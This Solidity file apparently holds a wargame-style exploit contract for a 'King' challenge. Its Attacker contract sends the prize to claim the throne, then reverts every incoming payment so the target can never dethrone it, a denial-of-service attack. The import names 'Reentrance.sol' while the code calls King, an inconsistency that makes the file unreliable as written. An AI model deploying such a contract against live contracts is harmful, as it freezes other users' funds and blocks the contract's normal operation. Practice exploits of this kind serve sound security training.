// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract Attacker {

  address payable target;
  address public deployer;

  constructor (address payable _target) public payable {
    target = _target;
    deployer = msg.sender;
  }

  function attack() public {
    uint prize = King(target).prize();
    target.call{value: prize}("");
    }

  receive() external payable {
    revert();
  }
}
